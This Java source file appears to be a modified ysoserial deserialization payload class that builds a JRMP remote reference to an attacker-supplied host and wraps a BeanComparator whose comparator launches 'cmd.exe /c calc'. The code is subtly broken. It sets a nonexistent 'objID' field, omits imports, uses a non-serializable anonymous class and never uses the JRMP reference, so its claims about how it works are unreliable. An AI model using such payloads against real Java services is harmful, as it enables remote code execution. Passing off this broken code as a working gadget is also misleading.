import java.lang.reflect.Constructor;
import java.rmi.server.ObjID;
import java.util.Random;
import org.apache.commons.beanutils.BeanComparator;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

@PayloadTest(
    harness = "ysoserial.payloads.JRMPReverseConnectSMTest"
)
@Authors({"mbechler"})
public class JRMPClient1 extends PayloadRunner implements ObjectPayload<Object> {
    public JRMPClient1() {
    }

    public Object getObject(String command) throws Exception {
        int sep = command.indexOf(58);
        String host;
        int port;
        if (sep < 0) {
            port = (new Random()).nextInt(65535);
            host = command;
        } else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }

        ObjID id = new ObjID((new Random()).nextInt());
        TCPEndpoint te = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));

        // Use reflection to load necessary classes
        Class<?> beanComparatorClass = Class.forName("org.apache.commons.beanutils.BeanComparator");

        // Create BeanComparator object using reflection
        Constructor<?> beanComparatorConstructor = beanComparatorClass.getConstructor();
        Object beanComparator = beanComparatorConstructor.newInstance();

        // Set the objID field of the BeanComparator to the specified ObjID
        Field objIDField = beanComparatorClass.getDeclaredField("objID");
        objIDField.setAccessible(true);
        objIDField.set(beanComparator, id);

        // Set the comparator field of the BeanComparator to a dummy Comparator
        Field comparatorField = beanComparatorClass.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(beanComparator, new Comparator() {
            public int compare(Object o1, Object o2) {
                // Execute the desired command
                String[] cmd = {"cmd.exe", "/c", "calc"};
                ProcessBuilder pb = new ProcessBuilder(cmd);
                pb.start();
                return 0;
            }
        });

        return beanComparator;
    }

    public static void main(String[] args) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient1.class.getClassLoader());
        PayloadRunner.run(JRMPClient1.class, args);
    }
}
